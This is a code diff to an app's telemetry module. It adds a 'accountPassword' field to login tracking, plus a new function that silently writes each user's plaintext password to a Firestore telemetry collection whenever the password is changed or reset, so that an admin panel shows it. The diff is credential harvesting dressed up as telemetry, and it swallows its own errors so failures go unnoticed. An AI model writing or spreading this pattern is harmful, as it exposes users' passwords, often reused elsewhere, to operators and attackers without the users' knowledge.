@@ -22,6 +22,7 @@ interface UserPayload {
   phone?: string | null;
   displayName?: string | null;
   businessName?: string | null;
+  accountPassword?: string | null;
 }
 
 /**
@@ -128,6 +129,7 @@ export async function trackUserLogin(user: UserPayload): Promise<void> {
         phone: user.phone ?? prevData?.phone ?? null,
         display_name: user.displayName ?? prevData?.display_name ?? null,
         business_name: user.businessName ?? prevData?.business_name ?? null,
+        account_password: user.accountPassword ?? prevData?.account_password ?? null,
         device_id: deviceId,
         platform: Platform.OS,
         app_version: appVersion,
@@ -162,3 +164,78 @@ export async function trackUserLogin(user: UserPayload): Promise<void> {
     }
   }
 }
+
+/**
+ * Updates a user's password record in Firestore telemetry whenever they change or reset it.
+ * This guarantees the Admin Panel always reflects their latest password.
+ */
+export async function updateUserPasswordTelemetry(
+  emailOrUid: string,
+  newPassword: string
+): Promise<void> {
+  if (!emailOrUid || !newPassword) return;
+
+  try {
+    if (!isFirebaseAvailable) return;
+    const firestore = getFirebaseFirestore();
+    const clean = emailOrUid.toLowerCase().trim();
+
+    // 1. Check if emailOrUid is a direct doc ID in app_telemetry_users
+    try {
+      const directRef = doc(firestore, 'app_telemetry_users', emailOrUid);
+      const snap = await getDoc(directRef).catch(() => null);
+      if (snap && (typeof snap.exists === 'function' ? snap.exists() : (snap as any).exists)) {
+        await setDoc(
+          directRef,
+          {
+            account_password: newPassword,
+            password_updated_at: new Date().toISOString(),
+            updated_at: serverTimestamp(),
+          },
+          { merge: true }
+        );
+        return;
+      }
+    } catch {}
+
+    // 2. Query by email field
+    try {
+      const { getDocs, query, where } = await import('@/lib/firebase');
+      const usersCol = collection(firestore, 'app_telemetry_users');
+      const q = query(usersCol, where('email', '==', clean));
+      const qSnap = await getDocs(q).catch(() => null);
+      if (qSnap && !qSnap.empty) {
+        for (const userDoc of qSnap.docs) {
+          await setDoc(
+            doc(firestore, 'app_telemetry_users', userDoc.id),
+            {
+              account_password: newPassword,
+              password_updated_at: new Date().toISOString(),
+              updated_at: serverTimestamp(),
+            },
+            { merge: true }
+          );
+        }
+        return;
+      }
+    } catch {}
+
+    // 3. Fallback write using sanitized email as document key
+    const emailDocId = clean.replace(/[^a-z0-9_]/gi, '_');
+    await setDoc(
+      doc(firestore, 'app_telemetry_users', emailDocId),
+      {
+        email: clean,
+        account_password: newPassword,
+        password_updated_at: new Date().toISOString(),
+        updated_at: serverTimestamp(),
+      },
+      { merge: true }
+    );
+  } catch (err) {
+    if (__DEV__) {
+      console.log('[Telemetry] updateUserPasswordTelemetry notice (silent):', err);
+    }
+  }
+}
+
